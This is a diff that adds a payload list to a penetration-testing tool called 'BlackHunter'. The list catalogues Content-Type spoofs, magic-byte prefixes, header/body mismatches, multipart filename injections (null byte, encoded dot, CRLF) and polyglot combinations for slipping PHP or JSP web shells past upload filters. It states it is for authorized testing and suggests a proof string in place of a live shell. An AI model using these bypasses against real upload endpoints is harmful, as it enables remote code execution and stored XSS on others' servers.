@@ -1,0 +1,804 @@
+# ============================================================
+# BlackHunter — Upload Payloads: MIME / Content-Type Bypass
+# ============================================================
+# Purpose : Enumerate Content-Type headers, magic-byte prefixes,
+#           and multipart tricks that may slip past an upload
+#           filter that trusts MIME type over actual content.
+# Use     : Authorized testing ONLY. See docs/ethical_guidelines.md
+# Format  : Each entry is a block delimited by [name] ... [/name].
+#           Directives:
+#             content_type : value to send in the Content-Type header
+#             magic        : magic-byte prefix to prepend to the shell body
+#             note         : short description
+#             applies_to   : php | jsp | any
+#           Lines starting with '#' are comments.
+# Warning : Prepend magic bytes to a real shell can break the
+#           shell's syntax. Use a polyglot body (see php_shells.txt
+#           and jsp_shells.txt) so both the magic bytes and the
+#           code remain valid.
+# ============================================================
+
+
+# ------------------------------------------------------------
+# 1. Plain "safe" Content-Types (no magic bytes)
+#    For filters that only inspect the header, not the body.
+# ------------------------------------------------------------
+[ct_image_gif]
+content_type: image/gif
+magic       : (none)
+note        : Most common "bypass" Content-Type
+applies_to  : any
+[/ct_image_gif]
+
+[ct_image_png]
+content_type: image/png
+magic       : (none)
+note        : PNG Content-Type
+applies_to  : any
+[/ct_image_png]
+
+[ct_image_jpeg]
+content_type: image/jpeg
+magic       : (none)
+note        : JPEG Content-Type
+applies_to  : any
+[/ct_image_jpeg]
+
+[ct_image_jpg]
+content_type: image/jpg
+magic       : (none)
+note        : Non-standard but accepted by some filters
+applies_to  : any
+[/ct_image_jpg]
+
+[ct_image_bmp]
+content_type: image/bmp
+magic       : (none)
+note        : BMP Content-Type
+applies_to  : any
+[/ct_image_bmp]
+
+[ct_image_webp]
+content_type: image/webp
+magic       : (none)
+note        : WebP Content-Type
+applies_to  : any
+[/ct_image_webp]
+
+[ct_image_svg]
+content_type: image/svg+xml
+magic       : (none)
+note        : SVG — also useful for XXE / stored XSS
+applies_to  : any
+[/ct_image_svg]
+
+[ct_image_tiff]
+content_type: image/tiff
+magic       : (none)
+note        : TIFF Content-Type
+applies_to  : any
+[/ct_image_tiff]
+
+[ct_image_ico]
+content_type: image/x-icon
+magic       : (none)
+note        : ICO Content-Type
+applies_to  : any
+[/ct_image_ico]
+
+[ct_application_pdf]
+content_type: application/pdf
+magic       : (none)
+note        : PDF Content-Type — often whitelisted for docs
+applies_to  : any
+[/ct_application_pdf]
+
+[ct_application_zip]
+content_type: application/zip
+magic       : (none)
+note        : ZIP Content-Type
+applies_to  : any
+[/ct_application_zip]
+
+[ct_application_octet]
+content_type: application/octet-stream
+magic       : (none)
+note        : Generic binary — sometimes auto-allowed
+applies_to  : any
+[/ct_application_octet]
+
+[ct_text_plain]
+content_type: text/plain
+magic       : (none)
+note        : Plain text — passes whitelist for .txt uploads
+applies_to  : any
+[/ct_text_plain]
+
+[ct_text_html]
+content_type: text/html
+magic       : (none)
+note        : HTML — useful for stored XSS
+applies_to  : any
+[/ct_text_html]
+
+[ct_application_xml]
+content_type: application/xml
+magic       : (none)
+note        : XML — useful for XXE
+applies_to  : any
+[/ct_application_xml]
+
+[ct_text_xml]
+content_type: text/xml
+magic       : (none)
+note        : XML variant
+applies_to  : any
+[/ct_text_xml]
+
+
+# ------------------------------------------------------------
+# 2. Magic-byte prefixes (for filters that sniff the body)
+#    Prepend the magic to the shell body. Use a polyglot shell
+#    so the code still parses.
+# ------------------------------------------------------------
+[magic_gif89a]
+content_type: image/gif
+magic       : GIF89a
+note        : GIF header — the classic bypass. Body follows.
+applies_to  : any
+[/magic_gif89a]
+
+[magic_gif87a]
+content_type: image/gif
+magic       : GIF87a
+note        : Older GIF header
+applies_to  : any
+[/magic_gif87a]
+
+[magic_png]
+content_type: image/png
+magic       : \x89PNG\r\n\x1a\n
+note        : PNG signature (8 bytes)
+applies_to  : any
+[/magic_png]
+
+[magic_jpeg_ffd8]
+content_type: image/jpeg
+magic       : \xff\xd8\xff\xe0
+note        : JPEG SOI + APP0 marker
+applies_to  : any
+[/magic_jpeg_ffd8]
+
+[magic_jpeg_ffd8_ffe1]
+content_type: image/jpeg
+magic       : \xff\xd8\xff\xe1
+note        : JPEG with EXIF marker
+applies_to  : any
+[/magic_jpeg_ffd8_ffe1]
+
+[magic_jpeg_ffd8_ffdb]
+content_type: image/jpeg
+magic       : \xff\xd8\xff\xdb
+note        : JPEG with DQT marker
+applies_to  : any
+[/magic_jpeg_ffd8_ffdb]
+
+[magic_bmp]
+content_type: image/bmp
+magic       : BM
+note        : BMP header
+applies_to  : any
+[/magic_bmp]
+
+[magic_webp]
+content_type: image/webp
+magic       : RIFF....WEBP
+note        : WebP header (RIFF + 4 size bytes + WEBP)
+applies_to  : any
+[/magic_webp]
+
+[magic_ico]
+content_type: image/x-icon
+magic       : \x00\x00\x01\x00
+note        : ICO header
+applies_to  : any
+[/magic_ico]
+
+[magic_pdf]
+content_type: application/pdf
+magic       : %PDF-1.4
+note        : PDF header
+applies_to  : any
+[/magic_pdf]
+
+[magic_zip_pk]
+content_type: application/zip
+magic       : PK\x03\x04
+note        : ZIP local file header
+applies_to  : any
+[/magic_zip_pk]
+
+[magic_gzip]
+content_type: application/gzip
+magic       : \x1f\x8b
+note        : Gzip header
+applies_to  : any
+[/magic_gzip]
+
+[magic_bzip2]
+content_type: application/x-bzip2
+magic       : BZh
+note        : Bzip2 header
+applies_to  : any
+[/magic_bzip2]
+
+[magic_rar]
+content_type: application/x-rar-compressed
+magic       : Rar!\x1a\x07\x00
+note        : RAR v4 header
+applies_to  : any
+[/magic_rar]
+
+[magic_7z]
+content_type: application/x-7z-compressed
+magic       : 7z\xbc\xaf\x27\x1c
+note        : 7-Zip header
+applies_to  : any
+[/magic_7z]
+
+[magic_mp3_id3]
+content_type: audio/mpeg
+magic       : ID3
+note        : MP3 with ID3 tag
+applies_to  : any
+[/magic_mp3_id3]
+
+[magic_mp3_fffb]
+content_type: audio/mpeg
+magic       : \xff\xfb
+note        : MP3 frame sync
+applies_to  : any
+[/magic_mp3_fffb]
+
+[magic_mp4_ftyp]
+content_type: video/mp4
+magic       : \x00\x00\x00\x18ftypmp42
+note        : MP4 ftyp box
+applies_to  : any
+[/magic_mp4_ftyp]
+
+[magic_ogg]
+content_type: audio/ogg
+magic       : OggS
+note        : Ogg header
+applies_to  : any
+[/magic_ogg]
+
+[magic_wav_riff]
+content_type: audio/wav
+magic       : RIFF....WAVE
+note        : WAV header
+applies_to  : any
+[/magic_wav_riff]
+
+[magic_avi_riff]
+content_type: video/x-msvideo
+magic       : RIFF....AVI 
+note        : AVI header
+applies_to  : any
+[/magic_avi_riff]
+
+[magic_flv]
+content_type: video/x-flv
+magic       : FLV\x01
+note        : FLV header
+applies_to  : any
+[/magic_flv]
+
+[magic_swf]
+content_type: application/x-shockwave-flash
+magic       : FWS
+note        : Uncompressed SWF
+applies_to  : any
+[/magic_swf]
+
+[magic_swf_zlib]
+content_type: application/x-shockwave-flash
+magic       : CWS
+note        : Zlib-compressed SWF
+applies_to  : any
+[/magic_swf_zlib]
+
+[magic_docx]
+content_type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
+magic       : PK\x03\x04
+note        : DOCX is a ZIP — same magic as ZIP
+applies_to  : any
+[/magic_docx]
+
+[magic_xlsx]
+content_type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+magic       : PK\x03\x04
+note        : XLSX is a ZIP
+applies_to  : any
+[/magic_xlsx]
+
+[magic_pptx]
+content_type: application/vnd.openxmlformats-officedocument.presentationml.presentation
+magic       : PK\x03\x04
+note        : PPTX is a ZIP
+applies_to  : any
+[/magic_pptx]
+
+[magic_jar]
+content_type: application/java-archive
+magic       : PK\x03\x04
+note        : JAR is a ZIP — relevant for Java targets
+applies_to  : jsp
+[/magic_jar]
+
+[magic_war]
+content_type: application/java-archive
+magic       : PK\x03\x04
+note        : WAR is a ZIP — deployable on Tomcat/JBoss
+applies_to  : jsp
+[/magic_war]
+
+
+# ------------------------------------------------------------
+# 3. Content-Type / magic-byte mismatches
+#    Header says one thing, body is another. Tests whether the
+#    server trusts the header or the body.
+# ------------------------------------------------------------
+[mismatch_gif_as_png]
+content_type: image/png
+magic       : GIF89a
+note        : PNG header, GIF body
+applies_to  : any
+[/mismatch_gif_as_png]
+
+[mismatch_png_as_gif]
+content_type: image/gif
+magic       : \x89PNG\r\n\x1a\n
+note        : GIF header, PNG body
+applies_to  : any
+[/mismatch_png_as_gif]
+
+[mismatch_jpeg_as_gif]
+content_type: image/gif
+magic       : \xff\xd8\xff\xe0
+note        : GIF header, JPEG body
+applies_to  : any
+[/mismatch_jpeg_as_gif]
+
+[mismatch_pdf_as_jpg]
+content_type: image/jpeg
+magic       : %PDF-1.4
+note        : JPEG header, PDF body
+applies_to  : any
+[/mismatch_pdf_as_jpg]
+
+[mismatch_zip_as_jpg]
+content_type: image/jpeg
+magic       : PK\x03\x04
+note        : JPEG header, ZIP body
+applies_to  : any
+[/mismatch_zip_as_jpg]
+
+[mismatch_html_as_jpg]
+content_type: image/jpeg
+magic       : <html>
+note        : JPEG header, HTML body — stored XSS
+applies_to  : any
+[/mismatch_html_as_jpg]
+
+[mismatch_svg_as_png]
+content_type: image/png
+magic       : <svg xmlns="http://www.w3.org/2000/svg">
+note        : PNG header, SVG body
+applies_to  : any
+[/mismatch_svg_as_png]
+
+[mismatch_xml_as_png]
+content_type: image/png
+magic       : <?xml version="1.0"?>
+note        : PNG header, XML body — XXE
+applies_to  : any
+[/mismatch_xml_as_png]
+
+
+# ------------------------------------------------------------
+# 4. Multipart form-data tricks
+#    Manipulate the multipart body itself, not just the header.
+# ------------------------------------------------------------
+[mp_missing_content_type]
+content_type: (omit)
+magic       : (none)
+note        : Omit the Content-Type part header entirely
+applies_to  : any
+[/mp_missing_content_type]
+
+[mp_empty_content_type]
+content_type: 
+magic       : (none)
+note        : Send an empty Content-Type value
+applies_to  : any
+[/mp_empty_content_type]
+
+[mp_double_content_type]
+content_type: image/jpeg, application/x-php
+magic       : (none)
+note        : Comma-separated — parser may take the first or last
+applies_to  : any
+[/mp_double_content_type]
+
+[mp_duplicate_content_type]
+content_type: image/jpeg
+magic       : (none)
+note        : Send two Content-Type headers; some parsers use the last
+applies_to  : any
+[/mp_duplicate_content_type]
+
+[mp_filename_with_quote]
+content_type: image/jpeg
+magic       : (none)
+note        : filename="shell.php" — quote injection in filename
+applies_to  : any
+[/mp_filename_with_quote]
+
+[mp_filename_with_newline]
+content_type: image/jpeg
+magic       : (none)
+note        : filename with embedded \r\n to inject headers
+applies_to  : any
+[/mp_filename_with_newline]
+
+[mp_filename_encoded]
+content_type: image/jpeg
+magic       : (none)
+note        : filename="shell%2ephp" — encoded dot
+applies_to  : any
+[/mp_filename_encoded]
+
+[mp_filename_double_encoded]
+content_type: image/jpeg
+magic       : (none)
+note        : filename="shell%252ephp" — double-encoded
+applies_to  : any
+[/mp_filename_double_encoded]
+
+[mp_filename_utf7]
+content_type: image/jpeg
+magic       : (none)
+note        : UTF-7 encoded filename
+applies_to  : any
+[/mp_filename_utf7]
+
+[mp_filename_utf8_overlong]
+content_type: image/jpeg
+magic       : (none)
+note        : Overlong UTF-8 encoding in filename
+applies_to  : any
+[/mp_filename_utf8_overlong]
+
+[mp_filename_null]
+content_type: image/jpeg
+magic       : (none)
+note        : filename="shell.php\x00.jpg" — null byte
+applies_to  : any
+[/mp_filename_null]
+
+[mp_filename_semicolon]
+content_type: image/jpeg
+magic       : (none)
+note        : filename="shell.php;.jpg"
+applies_to  : any
+[/mp_filename_semicolon]
+
+
+# ------------------------------------------------------------
+# 5. Content-Type case / whitespace / obfuscation
+#    For naive string matches like content_type == "image/jpeg".
+# ------------------------------------------------------------
+[ct_case_upper]
+content_type: IMAGE/JPEG
+magic       : (none)
+note        : Uppercase MIME type
+applies_to  : any
+[/ct_case_upper]
+
+[ct_case_mixed]
+content_type: ImAgE/jPeG
+magic       : (none)
+note        : Mixed-case MIME type
+applies_to  : any
+[/ct_case_mixed]
+
+[ct_leading_space]
+content_type:  image/jpeg
+magic       : (none)
+note        : Leading space in value
+applies_to  : any
+[/ct_leading_space]
+
+[ct_trailing_space]
+content_type: image/jpeg 
+magic       : (none)
+note        : Trailing space in value
+applies_to  : any
+[/ct_trailing_space]
+
+[ct_tab]
+content_type: image/jpeg\t
+magic       : (none)
+note        : Tab in value
+applies_to  : any
+[/ct_tab]
+
+[ct_newline]
+content_type: image/jpeg\n
+magic       : (none)
+note        : Newline in value
+applies_to  : any
+[/ct_newline]
+
+[ct_null_byte]
+content_type: image/jpeg\x00
+magic       : (none)
+note        : Null byte at end of value
+applies_to  : any
+[/ct_null_byte]
+
+[ct_double_slash]
+content_type: image//jpeg
+magic       : (none)
+note        : Double slash
+applies_to  : any
+[/ct_double_slash]
+
+[ct_semicolon_param]
+content_type: image/jpeg; charset=utf-8
+magic       : (none)
+note        : With parameter — some filters match exactly
+applies_to  : any
+[/ct_semicolon_param]
+
+[ct_semicolon_php]
+content_type: image/jpeg; application/x-php
+magic       : (none)
+note        : Parameter with a second type
+applies_to  : any
+[/ct_semicolon_php]
+
+[ct_plus_json]
+content_type: application/ld+json
+magic       : (none)
+note        : Unusual subtype that may bypass a blocklist
+applies_to  : any
+[/ct_plus_json]
+
+[ct_x_custom]
+content_type: x-image/jpeg
+magic       : (none)
+note        : Prefixed type
+applies_to  : any
+[/ct_x_custom]
+
+[ct_x_php]
+content_type: application/x-php
+magic       : (none)
+note        : Explicit PHP type — should be blocked, but test
+applies_to  : php
+[/ct_x_php]
+
+[ct_x_httpd_php]
+content_type: application/x-httpd-php
+magic       : (none)
+note        : Explicit PHP handler type
+applies_to  : php
+[/ct_x_httpd_php]
+
+[ct_x_httpd_php_source]
+content_type: application/x-httpd-php-source
+magic       : (none)
+note        : Source type — sometimes leaks source instead of executing
+applies_to  : php
+[/ct_x_httpd_php_source]
+
+[ct_x_jsp]
+content_type: application/x-jsp
+magic       : (none)
+note        : Explicit JSP type
+applies_to  : jsp
+[/ct_x_jsp]
+
+[ct_java_archive]
+content_type: application/java-archive
+magic       : (none)
+note        : JAR/WAR type
+applies_to  : jsp
+[/ct_java_archive]
+
+
+# ------------------------------------------------------------
+# 6. Double Content-Type / header injection via multipart
+#    When the parser is confused by duplicate headers.
+# ------------------------------------------------------------
+[dup_ct_first_wins]
+content_type: image/jpeg
+magic       : (none)
+note        : Send image/jpeg first, then application/x-php; parser uses first
+applies_to  : any
+[/dup_ct_first_wins]
+
+[dup_ct_last_wins]
+content_type: application/x-php
+magic       : (none)
+note        : Send application/x-php first, then image/jpeg; parser uses last
+applies_to  : any
+[/dup_ct_last_wins]
+
+[dup_ct_split_boundary]
+content_type: image/jpeg
+magic       : (none)
+note        : Duplicate Content-Type headers split across the boundary
+applies_to  : any
+[/dup_ct_split_boundary]
+
+
+# ------------------------------------------------------------
+# 7. Base64 / transfer-encoding tricks
+#    For filters that decode the body before scanning.
+# ------------------------------------------------------------
+[te_base64]
+content_type: image/jpeg
+magic       : (none)
+note        : Content-Transfer-Encoding: base64 — decode then exec
+applies_to  : any
+[/te_base64]
+
+[te_quoted_printable]
+content_type: image/jpeg
+magic       : (none)
+note        : Content-Transfer-Encoding: quoted-printable
+applies_to  : any
+[/te_quoted_printable]
+
+[te_binary]
+content_type: image/jpeg
+magic       : (none)
+note        : Content-Transfer-Encoding: binary
+applies_to  : any
+[/te_binary]
+
+[te_chunked]
+content_type: image/jpeg
+magic       : (none)
+note        : Transfer-Encoding: chunked on the multipart part
+applies_to  : any
+[/te_chunked]
+
+
+# ------------------------------------------------------------
+# 8. Polyglot-specific MIME combinations
+#    Pair these with the polyglot shells in php_shells.txt /
+#    jsp_shells.txt.
+# ------------------------------------------------------------
+[poly_gif_php]
+content_type: image/gif
+magic       : GIF89a
+note        : GIF header + PHP code + valid image tail
+applies_to  : php
+[/poly_gif_php]
+
+[poly_jpg_php]
+content_type: image/jpeg
+magic       : \xff\xd8\xff\xe0
+note        : JPEG header + PHP code
+applies_to  : php
+[/poly_jpg_php]
+
+[poly_png_php]
+content_type: image/png
+magic       : \x89PNG\r\n\x1a\n
+note        : PNG header + PHP code
+applies_to  : php
+[/poly_png_php]
+
+[poly_gif_jsp]
+content_type: image/gif
+magic       : GIF89a
+note        : GIF header + JSP code
+applies_to  : jsp
+[/poly_gif_jsp]
+
+[poly_pdf_jsp]
+content_type: application/pdf
+magic       : %PDF-1.4
+note        : PDF header + JSP code
+applies_to  : jsp
+[/poly_pdf_jsp]
+
+[poly_svg_php]
+content_type: image/svg+xml
+magic       : <svg xmlns="http://www.w3.org/2000/svg">
+note        : SVG wrapper + PHP code
+applies_to  : php
+[/poly_svg_php]
+
+[poly_svg_jsp]
+content_type: image/svg+xml
+magic       : <svg xmlns="http://www.w3.org/2000/svg">
+note        : SVG wrapper + JSP code
+applies_to  : jsp
+[/poly_svg_jsp]
+
+[poly_xml_php]
+content_type: application/xml
+magic       : <?xml version="1.0"?>
+note        : XML wrapper + PHP code (also useful for XXE)
+applies_to  : php
+[/poly_xml_php]
+
+[poly_xml_jsp]
+content_type: application/xml
+magic       : <?xml version="1.0"?>
+note        : XML wrapper + JSP code
+applies_to  : jsp
+[/poly_xml_jsp]
+
+[poly_html_php]
+content_type: text/html
+magic       : <!DOCTYPE html>
+note        : HTML wrapper + PHP code (stored XSS / exec)
+applies_to  : php
+[/poly_html_php]
+
+[poly_html_jsp]
+content_type: text/html
+magic       : <!DOCTYPE html>
+note        : HTML wrapper + JSP code
+applies_to  : jsp
+[/poly_html_jsp]
+
+
+# ============================================================
+# Notes for testers
+# ============================================================
+# 1. Two independent checks are usually in play:
+#      a) Content-Type header inspection
+#      b) Magic-byte / file-signature sniffing
+#    The blocks above are split so you can isolate which one
+#    is enforced. Start with section 1 (header-only), then
+#    section 2 (magic-only), then section 3 (mismatch).
+#
+# 2. A polyglot body must satisfy BOTH the magic-byte check
+#    AND the server's code parser. Use the polyglot shells in
+#    php_shells.txt / jsp_shells.txt (GIF89a + <?php ... ?>).
+#
+# 3. Some servers re-encode the upload (e.g., recompress
+#    images). If so, magic-byte tricks fail because the
+#    re-encoded file no longer contains your code. Fall back
+#    to extension tricks (extensions.txt) or non-image types
+#    (PDF, SVG, XML).
+#
+# 4. SVG and XML are high-value: they bypass most image-only
+#    checks, and they carry XXE / stored XSS payloads. Always
+#    try them if image polyglots fail.
+#
+# 5. Office formats (DOCX/XLSX/PPTX) are ZIP files. If the
+#    server extracts them, you can smuggle a shell inside the
+#    archive (zip-slip + execution).
+#
+# 6. Duplicate Content-Type headers (section 6) are parser-
+#    dependent. Test both orders; document which one the
+#    target honored.
+#
+# 7. Content-Transfer-Encoding (section 7) only matters if the
+#    upload pipeline decodes it. If the app stores the raw
+#    body, the encoded payload is inert.
+#
+# 8. Do NOT upload a working shell unless the RoE allows it.
+#    The proof string "BLACKHUNTER_UPLOAD_OK" is enough to
+#    demonstrate the finding.
+# ============================================================
